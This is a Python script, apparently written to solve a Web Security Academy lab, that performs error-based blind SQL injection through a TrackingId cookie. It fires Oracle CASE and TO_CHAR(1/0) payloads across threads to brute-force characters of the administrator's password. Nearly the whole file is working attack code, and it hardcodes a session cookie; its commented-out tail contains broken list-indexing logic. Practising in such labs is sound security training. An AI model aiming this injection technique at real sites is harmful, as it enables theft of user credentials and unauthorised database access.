import requests
import time
import re
import string
import concurrent.futures

url= 'https://0aac008804dc7acf813bcfe80029003d.web-security-academy.net/'

def set_cookie():
     r = requests.get(url)
     cookie = r.cookies.values()
     cook = {'session':cookie[0]}
     return cook

#cook1 =  set_cookie()

def replacer(input_string):
    # Using the replace method to replace spaces with '+'
    result_string = input_string.replace(' ', '+')
    return result_string

# Example usage:
input_text = "'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"

plus_string = replacer(input_text)


brute = string.digits+string.ascii_lowercase
sample = []
def enum_sql(i):


        cooker = {'TrackingId': f"HaYinyJJr9i320Zp'||(SELECT+CASE+WHEN+SUBSTR(password,2,1)='{i}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'--", 'session': 'seCU46SIB9ebaha93U5Nde3YQ3m7ovT9'}

        r = requests.get(url,cookies=cooker)


                # if r.text.find('Invalid username'):
                #     print('username not found')
                #     print(r.text.find('Invalid username'))

        if r.text.find('Internal Server Error') == -1:
            pass
        else:
            print("---present---")
            sample.append(i)
            print(sample)



# Use ThreadPoolExecutor to send requests concurrently
with concurrent.futures.ThreadPoolExecutor() as executor:
    # Submit requests and get Future objects
    futures = [executor.submit(enum_sql,i) for i in brute]


    # Wait for all requests to finish
    concurrent.futures.wait(futures)

# At this point, all requests have been completed
print("All requests completed.")

'''
print(sample)
for i in range(1,21):
    x = ''
    try:
        x = x+sample[f'{i}']
        print(x,end='')
    except KeyError as i:
        # Handle the KeyError
        x = x + ' '
        print(f"KeyError: {i}. The key 'd' does not exist in the dictionary.")
'''
